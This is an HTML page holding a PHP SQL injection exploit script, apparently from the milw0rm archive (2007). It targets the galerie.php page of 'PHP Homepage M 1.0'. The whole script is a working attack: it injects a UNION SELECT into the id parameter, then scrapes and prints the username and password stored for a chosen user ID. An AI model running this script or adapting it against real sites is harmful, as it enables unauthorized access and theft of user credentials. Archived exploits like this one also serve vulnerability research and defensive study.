<html><head><title>PHP Homepage M 1.0 galerie.php Remote SQL Injection Exploit</title></head><pre>&lt;?php
if ($argv[1] == '')
{
echo &quot;--PHP Homepage M V.1.0 galerie.php Exploit----\n&quot;;
echo &quot;only with magic_quotes_gpc OFF\n&quot;;
echo &quot;by [PHCN] Mahjong\n&quot;;
echo &quot;Usage : phpHPmv1.php http://127.0.0.1 / 1\n&quot;;
echo '----------------------------------------------';
}
else
{
$host = $argv[1];
$path = $argv[2];
$userid = $argv[3];

$data = $host.$path.&quot;galerie.php?act=show&amp;id=99999'+UNION+SELECT+username,passwort,passwort,passwort+FROM+user+WHERE+U ID='$userid&quot;;
$data = file_get_contents($data);
$pw = substr($data,strpos($data,'&lt;img border=&quot;0&quot; src=\'bilder/')+28,30);
$pw = explode('.',$pw);
$pw = $pw[0];
$user = substr($data,strpos($data,'UID=\''.$userid.'\'&lt;h1 align=&quot;center&quot;&gt;',30));
$user = explode('&gt;',$user);
$user = strrev($user[1]);
$user = substr($user,4,100);
$user = strrev($user);

echo &quot;--EXPLOIT FINISHED--\n&quot;;
echo &quot;userid : $userid\n&quot;;
echo &quot;username: $user\n&quot;;
echo &quot;password: $pw\n&quot;;
echo '--------------------';
}


?&gt;

# milw0rm.com [2007-10-08]</pre></html>